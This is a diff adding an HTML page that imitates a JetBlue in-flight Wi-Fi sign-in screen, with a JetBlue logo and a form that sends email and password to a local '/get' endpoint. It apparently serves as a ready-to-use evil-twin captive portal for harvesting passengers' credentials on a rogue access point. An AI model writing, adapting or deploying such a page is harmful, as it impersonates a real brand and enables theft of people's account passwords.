@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #003876;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .login-container {
+            background-color: #1A73E8;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+        }
+        .login-container h1, .login-container h2 {
+            text-align: center;
+        }
+        .login-container button {
+            width: 100%;
+        }
+        .form-control {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4 offset-lg-4 login-container">
+                <div id="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.4" clip-rule="evenodd" viewBox="0 0 560 400">
+                        <path fill="#fff" fill-rule="nonzero" d="M112 167h14v74c0 12-9 20-21 20h-5v-13h4c5 0 8-2 8-8zm0-28h14v14h-14zm36 56c1-10 7-16 15-16s14 6 15 16zm43 12v-12c0-17-13-29-28-29-13 0-28 9-28 36 0 28 16 35 30 35 9 0 18-3 25-11l-10-9c-4 4-10 7-15 7-10 0-17-6-17-17zm11-61h14v21h10v11h-10v40c0 4 2 5 5 5h5v13h-7c-10 0-17-6-17-17v-41h-7v-11h7zm70 47c11 0 16 7 16 15 0 7-5 14-16 14h-22v-29zm-37 43h41c15 0 27-11 27-27 0-10-5-20-16-23 11-5 14-13 14-21 0-15-9-26-28-26h-38zm36-84c11 0 16 7 16 14 0 8-5 14-16 14h-21v-28zm40-13h14v79c0 3 2 5 5 5h5v13h-6c-10 0-18-4-18-17zm30 28h13v41c0 10 6 15 14 15s14-5 14-15v-41h14v69h-14v-7c-5 5-11 8-18 8-11 0-23-8-23-24zm76 28c0-10 6-16 15-16 8 0 14 6 14 16zm43 12v-12c0-17-13-29-28-29-14 0-29 9-29 36 0 28 17 35 31 35 9 0 18-3 25-11l-10-9c-5 4-10 7-16 7-9 0-16-6-16-17z"/>
+                    </svg>
+                </div>
+                <form action="/get" id="email-form-step">
+                    <h1>Welcome aboard!</h1>
+                    <h2>Sign in with your JetBlue<br>Account to use Wi-Fi</h2>
+                    <div class="form-group">
+                        <input name="email" type="text" class="form-control" placeholder="Email" required>
+                    </div>
+                    <div class="form-group">
+                        <input name="password" type="password" class="form-control" placeholder="Password" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" type="submit">Sign In</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
